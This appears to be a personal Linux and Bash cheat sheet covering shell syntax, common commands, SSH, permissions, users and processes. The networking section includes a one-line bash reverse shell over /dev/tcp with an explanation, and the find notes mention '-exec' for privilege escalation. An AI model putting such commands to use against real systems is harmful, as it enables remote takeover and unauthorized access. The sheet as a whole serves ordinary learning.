Considerations:

* Everything in Linux is a file and the output of one command can become the input of another using a pipe. Files and folders that start with "." are hidden files.
All files in a linux filesystem stem from the root directory, / (just a slash).

* A file descriptor (fd) is a non-negative integer number that uniquely represents an opened file for a process. The OS maintains two file descriptor tables, one is per-process and the other system-wide.
In UNIX systems sockets are also indices into the same table as files (Windows is different). 
On a Unix-like operating system, the first three file descriptors, by default, are STDIN (standard input), STDOUT (standard output), and STDERR (standard error) with fds 0, 1 and 2 respectively. When a new file is open the lowest-numbered file descriptor not
currently open for the process is used.

* In a shell, as in any computer program, remember to use the arrow keys, start/end, and prev/next page to move around.

* In the bash shell (and the like) use tab for command autocompletion (press twice to disambiguate), ctrl-r to search command history, and the up/down arrow keys to insert recent commands.

* Use ctrl-c to discard the command you are typing (also useful to interrupt programs).

* Sometimes you need to surround text or paths between quotes, you can combine simple and double quotes to make one of the quotes part of the text.

* Some characters have special meanings, so they are reserved, you can escape them using back slack (\). One example is $, as it's used to access the value of defined variables (btw, you can define variables with var=value).

* You can use the output of one command as a parameter of another executing the command like this $(<command>). e.g.: sudo openvpn $(ls | grep my_vpn_file)
This is called command substitution. You could also surround a command with backsticks (`command`) to achieve the same purpose. $ is more readable and powerful.

* Edit ~/.bashrc to add env vars and commands to execute at bash startup, e.g.:
    export PATH=$PATH:/my/dir
    myprogram
Use '. ~/.bashrc' ('.' is the same as 'source') to load the new config into your current shell

* When you are in a terminal you can copy and paste with ctrl-shift-c and ctrl-shift-v.

* You can append a command with '2> /dev/null' to redirect errors to '/dev/null' (null device, a special file where input is discarded) and have a cleaner output.
Here 2 is the file descriptor associated to stderr (standard error).

* The system call is the fundamental interface between an application and the Linux kernel (type 'man syscalls' for more info)

* Pipe to clipboard: <content> | xclip -se c ('-se c' stands for '-selection clipboard'; see 'xclip -h')

* There are some commands like ssh that consume stdin entirely, producing strange results in your scripts, like while loops stopping reading after the first line. To prevent this, pass the -n option to your ssh command to make it read from /dev/null instead of stdin. Other commands have similar flags, or you can universally use < /dev/null.


Environment variables:

An environment variable (env var) is a variable with a name and an associated value.
Environment variables allow you to customize how the system works and the behavior of the applications on the system.
Programs executed from the shell inherit all of the environment variables from the shell. 
The set of all environment variables that have values is collectively known as the environment.
The environment keeps track of information that is shared by many programs, changes infrequently, and that is less frequently used.
Standard environment variables are used for information about the user's home directory, terminal type, current locale, path, etc.

You can set environment variables when running a specified program: [env] VAR=<value> program <parameters>
or set them for the current shell session using: export VAR=<value>.
See: https://askubuntu.com/a/205698

Use 'printenv' or 'env' to print all env vars and 'printenv' <var> to print a specific variable.


Desktop environment shortcuts (super = Windows key):

File explorer:    Super + e
Minimize windows: Super + d (not in all distros)
Web browser:      Super + w (not in all distros)
Terminal:         Ctrl + Alt + t ('Super + t' could be handy)
Action buttons:   Ctrl + Alt + Del


Shell and related terms:

Terminal = tty: physical device that can be used for entering data into, and transcribing data from a computer
Console: physical device consisting of a keyboard and a screen (it's a kind of terminal, usually text-based)
Terminal emulator: emulates a terminal and allows access to CLIs (like shells)
Shell: exposes an OS's services to a user or program, usually via a CLI
Command line interface (CLI): interface to type commands

See https://askubuntu.com/a/506628


Chaining operators:

Chaining of Linux commands means combining several commands and making them execute based upon the behavior of the operator used between them. It's important to note that, unlike many other languages, the short-circuiting booleans (&& and ||) have the same precedence, they also associate to the left.

1. Ampersand Operator (&): makes the command run in the background. Just type the command followed with a white space and ‘&‘. You can execute more than one command in the background in a single go. e.g.: command1 & command2 & (these commands run simultaneously)

2. Semi-colon Operator (;): used to run several commands at once and sequentially. e.g.: apt-get update; apt-get upgrade;

3. AND Operator (&&): executes the second command only if the execution of the first command succeeds, i.e., the exit status of the first command is 0. e.g.: ping -c3 www.tecmint.com && links www.tecmint.com (visit the website only if the host is live)

4. OR Operator (||): executes the second command only if the execution of the first command fails, i.e., the exit status of the first command is not 0.

5. NOT Operator (!): matches all except the condition provided, e.g., rm -r !(*.html) (delete all the files except ‘html‘ files). It's also used to invert a command's exit status, e.g., '! echo 'hi'; echo $?' (prints 1 instead of 0)

6. PIPE Operator (|): makes the output of the first command the input of the second command, e.g., 'ls -l | less' (pipeline the output of 'ls -l' to 'less' to see a paginated directory listing).

7. Command Combination Operator {}: combines two or more commands, the second command depends upon the execution of the first command. For example, check if a directory 'bin' is available or not, and output corresponding output with: [ -d bin ] || { echo Directory does not exist, creating directory now.; mkdir bin; } && echo Directory exists.

8. Precedence Operator (): makes it possible to execute commands in the desired precedence order. e.g.: '(command_1 && command_2) || (command_3 && command_4)'.

9. Concatenation Operator (\): concatenates long commands over several lines in the shell, e.g.: 'vim hello\ world.txt'.

10. Redirection Operators (<, >, >>): before a command is executed, its input and output may be redirected using a special notation interpreted by the shell. See Bash reference manual, section Redirections for more info.
Use > to redirect the output of a command, e.g., echo 'Hi there' > hi.txt (creates/replaces a file named hi.txt)
You can also redirect and append to the end of the file using >>.
You can use < to use a file as input of a program, e.g., program < input.txt


History expansion:

!n:        Refer to command line n
!-n:       Refer to the command n lines back
!!:        Refer to the previous command, this is a synonym for ‘!-1’.
$_:        Refer to the last argument to the previous command (env var called _)
!:[n|^|$]: Refer to the [n-th | first | last] argument to the previous command
!:*:       Refer to all arguments from the previously executed command
!string:   Refer to the most recent command preceding the current position in the history list starting with string


Scripts:

A Bash script is a plain text file which contains a series of commands. 
Anything you can run normally on the command line can be put into a script and it will do exactly the same thing. 
Similarly, anything you can put into a script can also be run normally on the command line and it will do exactly the same thing.
The default behavior of a Bash script is that the current working directory in the script is that of the shell from which you run it.
You can change the current working directory to always be the directory that the script is located in by adding: cd "$(dirname "$0")".
When we run a normal command (such as ls) we just type its name but when running a script we put a ./ in front of it. 
The variable PATH holds a list of folders for which you can execute their binaries by typing their names. You can see its value with echo $PATH.
Bash only looks in those specific directories and doesn't consider sub directories or your current directory. 
It will look through those directories in order and execute the first instance of the program or script that it finds. 
The $PATH variable is an individual user variable so each user on a system may set it to suit themselves.
It allows us to have several different versions of a program installed. We can control which one gets executed based on where it sits in our $PATH.
You could also use it wrap other programs.

The Shebang (#!):

#!/bin/bash should be the first line of any bash script. The hash exclamation mark ( #! ) character sequence is referred to as the Shebang. Following it is the path to the interpreter (or program) that should be used to run (or interpret) the rest of the lines in the text file. (For Bash scripts it will be the path to Bash, but there are many other types of scripts and they each have their own interpreter.) The shebang must be on the very first line of the file (line 2 won't do, even if the first line is blank). There must also be no spaces before the # or between the ! and the path to the interpreter.
Whilst you could use a relative path for the interpreter, most of the time you are going to want to use an absolute path. You will probably be running the same scripts from a variety of locations.
It is possible to leave out the line with the shebang and still run the script but it is unwise. If you are at a terminal and running the Bash shell and you execute a script without a shebang then Bash will assume it is a Bash script. So this will only work assuming the user running the script is running it in a Bash shell and there are a variety of reasons why this may not be the case, which is dangerous.


Executing a script in the shell:

There are two ways of doing it:
1. Launch the script as a program, where it has its own process.
2. Source the script as a bunch of text, where the text is processed by the current shell.

To launch the script as a program:
Add the line #!/bin/bash as the first line of the script. This will be read by the loader, which has special logic that interperts the first two characters #! as "launch the program coming next, and pass the contents into it". Note this only properly works for programs written to receive the contents.

To source the script into the current shell:
Type the command '. script.sh' or 'source script.sh' (they are equivalent). This acts as if you typed in the contents of "script.sh". For example, if you set a variable in "script.sh" then that variable will be set in the current shell. You will need to undefine the variable to clear it from the current shell. This differs heavily from the #!/bin/bash example, because setting a variable in the new bash subprocess won't impact the shell you launched the subprocess from.



Terminal control sequences:

Commands sent to the terminal that input a specific non-printable ASCII character to perform an associated action.

ctrl-c: interrupts the running program
ctrl-d: sends an EOF (end of file) to close the terminal
ctrl-z: suspends the running program
ctrl-s: freezes the screen, stopping the display
ctrl-q: thaws out the screen and allows the screen display to continue
ctrl-h: deletes the last character typed
ctrl-w: deletes the last word typed
ctrl-u: deletes the last line typed
ctrl-r: retrieves previously run commands so you can run them again
ctrl-u: removes text from the command line and places it in the shell clipboard
ctrl-y: grabs text from the clipboard
ctrl-l: clears the screen
ctrl-a: moves cursor to the beginning of the line
ctrl-e: moves cursor to the end of the line


General commands:

A majority of commands allow for arguments to be provided. These arguments are identified by a hyphen and a certain keyword known as flags or switches. Commands usually have a --help option. This option will list the possible options that the command accepts, provide a brief description and example of how to use it. This option is, in fact, a formatted output of what is called the man page (short for manual), which contains documentation for Linux commands and applications. To access this documentation, we can use the man command and then provide the command we want to read the documentation for, e.g. 'man ls'.

Note: <param> denotes a parameter, [option] denotes an optional parameter and (option) denotes an optional parameter with a description of it.

Clear screen:                     clear
Install package:                  apt install -y <package>
Show package info:                apt info <package> 2>/dev/null | awk '/Description/,0' (from 'Description' 'til the end of input)
Check if package is installed:    apt list <package> OR apt list --installed | grep <package>
Show manual page of <name>:       man [<page>] <name>
Create alias for a command:       alias NAME="VALUE" (append to .bashrc to persist it across logins)
Search for commands:              apropos <keyword>
Print text:                       echo <text>
Shutdown the machine:             shutdown (0 | now: right away, -r: reboot)
See ASCII codes:                  man ascii
See exit code of prev command:    echo $? ('?' is a var that holds it)
Pipe content to clipboard         <content> | xclip -se c

Show current location:            pwd
List directory contents:          ls <location = .> (-l: as list, -a: show hidden files, -h: human-readable sizes)
Common shortcut for ls -la:       ll (shortcuts or aliases are defined with alias)
Print file content:               cat <file>
Print file (numbered lines):      nl <file>
Split string with a delimiter:    cut -d '<delimiter>' -f <field_list> (e.g. -3,5,7-9,13-)
Get prefix/suffix/sucharacters:   cut -c <chars_list> (e.g. -3,5,7-9,13-)
Print first lines of the file:    head [-<lines>] <file> (10 by default)
Print all but the last lines:     head -n -<lines> <file>
Print last lines of the file:     tail [-<lines>] <file> (10 by default)
Redirect input to file & stdout:  tee <file> (e.g.: ls -la | tee listing.txt)
Print specific lines of a file:   sed -n '<start_line>[<end_line>]p' <file>
Print columns from tabular data:  awk '{print "Min:", $3, "Max:", $2}' <file>
Print last column:                awk '{print $NF}' <file>
Change directory:                 cd <directory> (.: current dir, ..: parent dir)
Create new empty file:            touch <file>
Make new directory:               mkdir <dir_name>
Copy file:                        cp <source> <destination> (-R: copy folder) 
Move file:                        mv <source> <destination>
Remove file:                      rm <file> (-r: delete dirs, -f: never prompt)
Remove files recursively:         find . -name <pattern> -delete (first run it without -delete to see what you'll remove)
File type and information:        file <filepath>
Find files:                       find / -name *.txt (find all txt files in the root directory); see 'Finding files' section
Locate file:                      locate <name | relative path>
Check file types/existence:       [  (opening square bracket is command; [ -d bin ] to check if a dir called bin exists in the current folder) 
Find patterns in text:            grep <pattern> (-v: invert matches, -B <num>: print  <num>  lines  of  leading  context  before  matching lines)
Find files with a pattern:        rgrep <pattern>
Page through text:                less <file> (when inside less use: h: help, q: quit, /key: find key, n (N): next(prev) result
Count lines/bytes/chars in file:  wc -l <file> (count lines)
locate a command:                 which <command>
Locate command, src and man page: whereis <command>
Sort file contents:               sort <file>

Show current user id:             id
Show current user name:           whoami
Become another user:              su <user> (don't specify a user to become superuser; add -l to inherit more properties of the new user, like env vars and bashrc)
Change file privileges:           chmod <file> (chmod +x: execution, chmod 777: all privileges), you can't chmod FAT32 filesystems, move the executable
Change the owner of a file:       chown [<new_owner>][:[<new_group>]] <file>
Change group ownership of a file: chgrp <new_group> <file>
Execute command as root:          sudo <command>

System information:               uname -a
Find out OS version:              run 'hostnamectl' or 'cat /etc/os-release'
Detailed system info:             neofetch
Processes information:            ps [aux] (add 'aux' to see the processes run by other users and the system; add axjf to view process tree)
Real-time processes info:         top (stats are updated every 10 secs or when you use the arrow keys)
Interactive process viewer:       htop
Kill a process:                   kill <pid> (we can send signals to the process to be killed: SIGTERM to allow cleanup (default), SIGKILL to avoid cleanup, SIGSTOP to stop a process)
Block devices:                    lsblk (-f: filesystems info)
Installed harware and drivers:    lspci
Disk space usage/mounted fs's:    df -h (fs = file system)
File space usage:                 du -sh[D] <file> (D: dereference symlinks, s: summarize, alternatively set depth to 0 with d0)
Find out system uptime:           uptime (tells the current time, how long the system has been running and other stats)
Change display settings:          xrandr (e.g. set brightness with '--output <screen_name> --brightness 0.5', get the screen name without args)

List zip content:                 < vim | less > <file>
List archive content:             7z l <file>
Create tar file:                  tar czfp < output | - > <dir> (use - to send to stdout, z filters through gzip)
Extract tar file:                 tar xzfp < file | - >
Compress into gzip file:          gzip <file> (-c: to stdout)
Decompress gzip files (gz):       gzip -d <file>
Compress into zip file:           zip (-r: recursive) (-e: encrypt) (-9: best compression) <output> <input> 
Decompress zip file:              unzip <file>
Create 7zip archive:              7z a [-p<password | empty to be prompted for it>] (-mhe: hide names) (-v<num>[k|m|g]: volume size) (-mx=9: best compression, -mx0: no compression) <output> <input> (output extension determines compression method)
Decompress [multi-part] archives: 7z x [-p<pass>] <archive> [<files_to_extract>...]

Find diffs between files/dirs:    diff <file1> <file2>
Check file checksum:              echo "<hash> <filename>" | {md5sum | sha1sum | sha256sum | sha512sum} -c -
Print file checksum:              <*>sum <file> (* = {md5|sha1|...})

List files by file type:          find -type l -ls (list symlinks in the cur dir)
Check if string is empty:         [ -z <string> ]
Print lines with > x chars:       awk 'length($0) > <x>' <file>
Find length of the longest line:  awk '{ if (length($0) > max) max = length($0) } END { print max }' <file>
Turn file into string with '\n':  awk '$1=$1' ORS='\\n' <file>
Print odd/even lines:             sed -n 'p;n' / sed -n 'n;p'
Print sequence of numbers:        seq [<start> [<increment>]] <end>


Media files:

Open media file:                  [firefox | google-chrome] <file> (you can easily open images, audio, video, and documents)
Open image:                       [feh | eog] <file> (feh cleanly shows you the image and eog allows you to browse images)
Run VLC from CLI:                 cvlc --play-and-exit audio.mp3 
Compress video:                   ffmpeg -i <input_video> -vcodec libx265 -crf 27 output.mp4 (keep CRF range for H.265 in [24-30], lower values, higher quality)
Read PDF:                         firefox/google-chrome/atril <pdf_file>
Remove password from PDF:         qpdf --password=<pass> --decrypt <input> <output>
Compress PDF with Ghostscript:    gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/ebook -dNOPAUSE -dQUIET -dBATCH -sOutputFile=output.pdf input.pdf
                                  -dPDFSETTINGS options:
                                  /screen: lower quality, smaller size. (72 dpi)
                                  /ebook: for better quality, but slightly larger pdfs. (150 dpi)
                                  /prepress: output similar to Acrobat Distiller "Prepress Optimized" setting (300 dpi)
                                  /printer: selects output similar to the Acrobat Distiller "Print Optimized" setting (300 dpi)
                                  /default: selects output intended to be useful across a wide variety of uses, possibly at the expense of a larger output file

Translator (Translate Shell):     
	- Usage: trans [-b|-brief] [source=en]:[target=en] [word | phrase]
	- Languages: langs use a two-letter code, read them all with 'trans -R'
	- Installation: install with 'apt install gawk && wget git.io/trans && chmod +x trans && mv trans /usr/local/bin')


YouTube downloader (youtube-dl):
	- Installation:
	    sudo curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /usr/local/bin/youtube-dl
	    sudo chmod a+rx /usr/local/bin/youtube-dl
	- Usage: 
	    Download video/playlist: youtube-dl [--download-archive archive.txt] [--write-sub] [--write-description] <url | id>
	    Download audio:          youtube-dl -x --audio-format mp3 <url>


Networking:

Test host reachability:           ping <host> (either domain or IP address)
Web browser:                      links2 <url>
Connect to a VPN:                 sudo openvpn <vpn_key_file>
SSH into a machine:               ssh <user>@<ip>[:<port>] (you'll be prompted for a pass; add '<command> >> <local_file>' to send output to local file)
Connect to ProtonVPN:             protonvpn-cli
Get private IPs:                  ip -4 -o a | awk '{print $4}' 
Get public IP:                    curl -sL ipinfo.io/ip
Show active network interfaces:   ifconfig
Show accesible networks:          netstat -rn
Download file using wget:         wget <url> (wget supports HTTP, HTTPS, and FTP; see curl for a powerful alternative to transfer data from or to a server)
Download file using curl:         curl -L <url> -o <file>
Download file using netcat:       printf 'GET /<relative_path> \n' | nc <host> <port> > <filename> 
Download/upload file using SCP:   scp <source> <destination> e.g.: scp user@192.168.1.23:/root/file.txt transferred.txt | scp file.txt user@192.168.1.23:/home/user/transferred.txt
Start reverse shell:              bash -i >& /dev/tcp/<host>/<port> 0>&1     (requires a bash shell, otherwise wrap it with 'bash -c "<command>"')
The code to start a reverse shell runs a new interactive instance of bash (bash -i), on a TCP connection to the specified port on the specified host which is created for the duration of the bash process. Standard output and standard error are sent through this connection (>&), and standard input is read through this connection (0>&1 — this should be 0<&1 but 0>&1 works too).


Combining commands:

- Number of files in a folder:
ls -1 | wc -l
- Count the number of specific characters in a line: 
CHAR=',' && echo a,b,,,e | sed "s/[^$CHAR]//g" | awk '{ print length }'
- Copy all csv files from <server_path> into the current directory:
sshpass -p <pass> sftp <user>@<ftp_server>:<server_path>/*.csv .


Secure Shell (SSH):

SSH (SSH client) is a program for logging into a remote machine and for executing commands on a remote machine. It is intended to provide secure encrypted communications between two untrusted hosts over an insecure network.  X11 connections, arbitrary TCP ports and UNIX-domain sockets can also be forwarded over the secure channel.

- How to enable SSH:

Install server:                     sudo apt-get install -y openssh-server
Service status:                     sudo systemctl status ssh
Firewall rule:                      sudo ufw allow ssh
Reload & enable firewall on boot:   sudo ufw enable 

- SSH with public-key authentication:

It removes the need to enter a password every time you need to connect to a remote SSH host.
We can create public/private key pairs to authenticate SSH connections with OpenSSH (apt-get install openssh-client -y).
To generate a new key pair use the ssh-keygen command. This command will overwrite your old key pair and provision a new one. 
Generate an RSA ssh key pair with 4096 bits using the command: ssh-keygen -t rsa -b 4096
The command will prompt you for a file name. By default, the ssh key pairs are stored as id_rsa and id_rsa.pub in ~/.ssh for private key and public key, respectively. 

You can protect your private key with a passphrase. In the case that someone gains access to your private key they won't be able to use it. The downside to passphrases is that you need to enter it every time you create a connection using SSH. You can temporarily cache your passphrase using ssh-agent so you don't have to enter it every time you connect.

To use the SSH key pair you created, we need to copy the public key to the remote server we wish to manage with: ssh-copy-id <remote_user>@<host>. The command will prompt you to enter the SSH password. Once authenticated, the command appends the public key to the ~/.ssh/authorized_keys file. This file is a list of public keys that are allowed to log into that specific account on that specific server. 

Then, you should be able to SSH into the remote server without being prompted for a password (unless you entered a passphrase) as long as you keep your private key in your ~/.ssh directory or you use the -i flag to select a file from which the identity (private key) for public key authentication is read, i.e., you just have to type: ssh [-i <identity_file>] <remote_user>@<host>.

You can add an extra layer of security by disabling password logins. In file /etc/ssh/sshd_config uncomment and change to yes the value PasswordAuthentication. Then run: service ssh restart.


Finding files: 

Some flags: find [<location>] [-perm { |-|/}<permissions>] [-type {d|f}] [-name <pattern>] [-user <user>] [-size {-| |+}<size>{c|k|M|G}]
e.g.: find ~ -name *config* -type f -perm -g=r,o=r -size -2M --> Files in the current user's home, with a name that includes 'config', where the file owner's group and others can read, and the file size is less than 2 MB.
Notes: 
- About perm: (empty) = exact permissions, - = at least those permissions, and / = either permission bit (at least one of the groups)
- About type: d = dir and f = file
- About size: - = less than, + = more than, and (empty) = exactly that size
- You can use either the format <who>=<permission> or <who>+<permission>. e.g.: u+r | u=r
- You can also use iname instead of name to make it case insensitive
- You should always enclose your name pattern in quotes
- Time-related searches may be useful. The flag consists of a word and a prefix. The words are min and time, for minutes and days, respectively. The prefixes are a, m, and c, and are used to specify when a file was last accessed, modified, or had its status changed. As for the numerical values, the same rules of the -size flag apply, except there is no suffix. To put it all together: in order to specify that a file was last accessed more than 30 minutes ago, the option -amin +30 is used. To specify that it was modified less than 7 days ago, the option -mtime -7 is used. (Note: when you want to specify that a file was modified within the last 24 hours, the option -mtime 0 is used.)
- You can suppress the output of any possible errors to make the output more readable. This is done by appending 2> /dev/null to your command. This way, you won’t see any results you’re not allowed to access.
- You can use the -exe flag in your find command to execute a new command. e.g.: -exec whoami \;. It can be used for privilege escalation.
- There are optional powerful flags like: -delete, -ls, or -exec, to apply to each file found
- Use -prune to exclude directories, you must specify them after the search dir and before any other option like this: find <search_dir> \( -path "/dir1" -o -path "./dir2" -o -path "/dir3" \) ! -prune -o -name "<pattern>" 2>/dev/null
Note: you can remove the group operation, i.e. (\ (\, if you want to exclude only one dir. For more info read stackoverflow.com/a/63523300)


Understanding ls command output:
The columns of the output in the long listing format are from left to right: file type and permissions, link count, owner, group, file size, last modified date, and file name.
Unix file systems keep track of a "link count" to all objects in the file system. This "link count" value is the number of different directory entries that all point to the inode associated with the object. In the case of a regular file, the link count is the number of hard links to that file. However, Unix file systems don't let you create hard links to directories, yet the link count on a directory is always at least two. Why is this so? There are pointers from parent directories to child directories, and viceversa (the ".." link). And every dir contains the "." link that points back to itself.
If a kernel-level rootkit would be used to hide a directory, the link count would betray this discrepancy. It's very easy to write a tool to detect hidden dirs. This is part of the chkrootkit tool (checks for signs of rootkits).


Links (Linux shortcuts and dup file node):

A symlink (also called a symbolic link) is a type of file in Linux that points to another file or a folder on your computer. Symlinks are similar to shortcuts in Windows.
In Linux systems, the data structure that does the actual storing of information is called an Inode. A hard link is a file all on its own, and the file references or points to the exact spot on a hard drive where the Inode stores the data. A soft link isn't a separate file, it points to the name of the original file, rather than to a spot on the hard drive.
ln is the link command. By default, ln creates hard links, add the -s flag to make it soft.
Create symlink: ln -s /path/to/file /path/to/symlink
Delete symlink: unlink /path/to/symlink | rm /path/to/symlink                  
Find broken symlinks: find . -xtype l
Find resolved symlink: readlink -f <symlink> (-f: follow symlinks recursively)
Note: you cannot create hard links to files in different partitions


Users, groups and permissions:

User (u): the owner of the file (person who created the file).
Group (g): the group can contain multiple users. Therefore, all users in that group will have the same permissions. It makes things easier than assign permission for every user you want.
Other (o): any person has access to that file, that person has neither created the file, nor are they in any group which has access to that file.

The permissions of a file are shown when you ls (list) a directory in the first column of the output, it looks like -rwxr--r--.
The first character is the file type, it can be - (regular file) or d (directory). Then each block of three belongs to the user, group and other respectively.
The 3 characters in each block are r (read), w (write), x (execute) and - (when the corresponding permission is absent). 

Permissions are changed using the chmod command. e.g.: chmod <mode> <file>   

Permission are represented by 'modes' which can be either a symbolic representation of changes to make, or an octal number representing the bit pattern for the new mode bits.

- Symbolic representation: WhoWhatWhich == {u|g|o|a}{+|-|=}{r|w|x|s|t|S|T} where u,g,o,a == user,group,other,all and +,-,= == add,remove,set exact
e.g.: chmod o+w file.txt (add write permission for other users to 'file.txt')

- Octal representation: <user_perm><group_perm><other_perm> where each permission is an octal digit (0-7):
0 = no permission, 1 = execute, 2 = write, 3 = execute and write, 4 = read, 5 = read and execute, 6 = read and write, 7 = read, write, and execute. 
e.g.: chmod 774 file.txt (the user and its group have every permission but others only can read)

Special permissions (each of them replaces the execute permission in user, group and other as listed below respectively):
You can add them with their symbol (as a capital letter if execute permission is not set) or with a fourth bit prepended in octal. 
- SUID (4 | s): execute a file as its owner
- SGID (2 | s): if set on a file, execute as the group owner, and if set on a dir, files created in that dir will have their group ownership set to that of the group owner
- Sticky (1 | t): only affects dirs, it restricts file deletion, only the owner of a file or root can remove it (e.g.: /tmp or /var/spool/cron/crontabs)

Process ownership:
Real user ID: process owner
Effective user ID: current privileges of the process
Saved user ID: saved user to switch when a task is completed

Create user (a group with the same name will be created by default):
1. sudo useradd -m -s /bin/bash <user> (-m: create a user dir inside /home; -s: login shell) 
2. sudo adduser <user> (this does the same as the previous command)
Afterwards, you need to set a password with: sudo passwd <user>
Note: you can issue 'cat /etc/passwd' to verify the new user has been created

Change pass:                   passwd <user>
Run commands as other user:    su [-] [<user> = root] (if - is added before the user, then the env is changed to the user's)

Delete user:
1. sudo userdel <user>, then you must delete the user directory
2. sudo deluser --remove-home <user> (also deletes the user dir)

A group is a collection of users (a user can belong to multiple groups). The primary purpose of the groups is to define a set of privileges like read, write, or execute permission for a given resource that can be shared among the users within the group. You can see all the groups with: cat /etc/group
List a user's groups:          groups <user>
Create group:                  sudo groupadd <group>
Add user to a group:           sudo usermod -aG <group> <user>
Delete user from a group:      sudo gpasswd -d <user> <group>
Delete group:                  sudo groupdel <group>

The /etc/passwd contains one entry per line for each user (user account) of the system. This file shuld be world-readable as many utilities use it to map user IDs to user names. All fields are separated by a colon (:) symbol. There are 7 fields:

1. Username: It is used when user logs in. It should be between 1 and 32 characters in length.
2. Password: An x character indicates that the encrypted password is stored in /etc/shadow file.
3. User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. Group ID (GID): The primary group ID (stored in /etc/group file).
5. User ID Info (GECOS): The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field is used by finger command.
6. Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exist then user's directory becomes '/'.
7. Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. For example, sysadmin can use the nologin shell, which acts as a replacement shell for the user accounts. If shell set to /sbin/nologin and the user tries to log in to the Linux system directly, the /sbin/nologin shell closes the connection.


Automount drive:
1. sudo blkid
2. sudo mkdir /mnt/<name-of-the-drive>
3. Append 'UUID=<uuid-of-your-drive> <mount-point> <file-system-type> <mount-options> <dump> <pass>' to /etc/fstab separating these items with tab. Usually you'll want to use defaults, 0 and 2 for the last three options, see 'man fstab'. 
4. sudo mount -a
Note: /media is where the system mounts removable media, and /mnt is for you to mount things manually.

Mount an external drive at boot time only if it is plugged in:
Use mount options: rw,auto,nofail (read-write, automount during boot, boot normally if device doesn't exist)
If you connect the device while the system is running, the device may not mount immediately, type mount -a to reload fstab.


Format drive:
1. lsblk -f or df
2. sudo umount /dev/<device_name>
3. sudo mkfs.[vfat|ntfs] -f -L <volume_name> /dev/<partition_name>


Create bootable Linux USB drive:
1. Unmount USB partition:         sudo umount /dev/<device_name> (use lsblk to find your device partition)
2. Copy content from ISO:         sudo dd if=/path/to/input.iso of=/dev/<device_name> conv=fdatasync status=progress


Make GRUB recognize Windows:
1. Boot Ubuntu and mount your Windows partition (simply use your file explorer)
2. Run the following on the command line (Ctrl+Alt+t): sudo os-prober
3. If your Windows installation was found, you can run: sudo update-grub


Free up space:
1. Empty trash folder: rm -rf ~/.local/share/Trash/*
2. Get rid of packages that are no longer required: sudo apt-get autoremove
3. Uninstall unnecessary applications: sudo apt-get remove <package-name>
4. Clean up APT cache: sudo apt-get autoclean (outdated packages) or sudo apt-get clean (complete apt cache), ('sudo du -sh /var/cache/apt' to see cache size)
5. Clear systemd journal logs older than 3 days: sudo journalctl --vacuum-time=3d ('journalctl --disk-usage' to check log size)
6. Clean the thumbnail cache: rm -rf ~/.cache/*  ('du -sh ~/.cache' to see cache size)


Processes:

Processes are the programs that are running on your machine. They are managed by the kernel, where each process will have an ID associated with it, also known as its PID. The PID increments for the order In which the process starts. I.e. the 60th process will have a PID of 60. Use the ps command to show the active processes.
The Operating System (OS) uses namespaces to ultimately split up the resources available on the computer to (such as CPU, RAM and priority) processes.
Namespaces are great for security as it is a way of isolating processes from another -- only those that are in the same namespace will be able to see each other.

init (short for initialization) is the first process started during booting of the computer system. Init is a daemon process that continues running until the system is shut down. It is the direct or indirect ancestor of all other processes and automatically adopts all orphaned processes. Init is started by the kernel during the booting process; a kernel panic will occur if the kernel is unable to start it. Init is typically assigned process identifier 1. It provides a way of managing a user's processes and sits in between the operating system and the user. 
systemd is the standard system and service manager in modern Linux. Any program or piece of software that we want to start will start as what's known as a child process of systemd. 
The command systemctl allows us to interact with the systemd process/daemon with the format: systemctl [option] [service]. Some options include: stop, start, restart, reload, and status.
Compatible programs will provide service unit files used by systemd to manage the program's execution.

You can configure systemd to run programs automatically during Linux startup following these steps:
1. Check if service unit for your program exists with: systemctl list-unit-files --type=service | grep [service]
You'll have to create your own service unit if it's a custom program or if your program doesn't come with one during installation.
2. Enable service unit that you want to execute during startup with: systemctl enable [service_unit] 
3. Check if service unit is enabled to confirm with: systemctl is-enabled [service_unit]


Jobs:

A job is a process that the shell manages. Each job is assigned a sequential job ID. Because a job is a process, each job has an associated PID. There are three types of job statuses:
1. Foreground: When you enter a command in a terminal window, the command occupies that terminal window until it completes. This is a foreground job.
2. Background: When you enter an ampersand (&) symbol at the end of a command line, the command runs without occupying the terminal window. The shell prompt is displayed immediately after you press Return. This is an example of a background job.
3. Stopped: If you press Control + Z for a foreground job, or enter the stop command for a background job, the job stops. This job is called a stopped job.

Job control commands:
* jobs	   Lists all jobs
* bg %n    Places the current or specified job in the background, where n is the job ID
* fg %n	   Brings the current or specified job into the foreground, where n is the job ID
* Control-Z  Stops the foreground job and places it in the background as a stopped job

Pressing Ctrl+Z sends the TSTP signal to your process. This halts execution (the kernel won't schedule any more CPU time to the process) and the process is awaiting a CONT to continue processing. You can emulate/replicate this via kill -TSTP and kill -CONT (since kill will send a nominated signal to your process, despite the name!).
The shell has the functionality to 'background' the process, but this is a relationship between the shell and the process. The process itself doesn't really have the concept of 'background' or 'foreground'.


Package management (software / apps / executables):

A package manager is a tool that allows users to install, remove, upgrade, configure and manage software packages on an operating system. The package manager can be a graphical application like a software center like Discover or a command line tool like apt or pacman.
Dpkg is a base package management system for the Debian Linux family (which includes Ubuntu, Linux Mint, Kali Linux and Parrot OS), it is used to install, remove, store and provide information about .deb packages. It is a low-level tool and there are front-end tools that help users to obtain packages from remote repositories and/or handle complex package relations and these include: APT (Advanced Packaging Tool), Aptitude Package Manager, and Synaptic Package Manager.
Many packages use dependencies. Dependencies are additional packages required by the principal package in order to function properly. Over time you may hoard lots of unnecessary packages that were once a dependecy of other packages. Use 'sudo apt autoremove' to take care of them.

Whilst Operating System vendors will maintain their own repositories of packages, additional repositories can be added.
You may need to download a GPG key and use apt-key to trust the new source with: wget -q -O - <gpg_key_url> | sudo apt-key add - 
You may also found key IDs from a particular keyserver, to add them use: sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys <key_ID> (Ubuntu is just a common example)

Some methods to add repos in Debian-based distros:
1. Using command line: sudo add-apt-repository ppa:Software_name/ppa (add-apt-repository --remove ppa:PPA_Name/ppa to remove them)
2. Editing /etc/apt/sources.list and adding manually the new entry
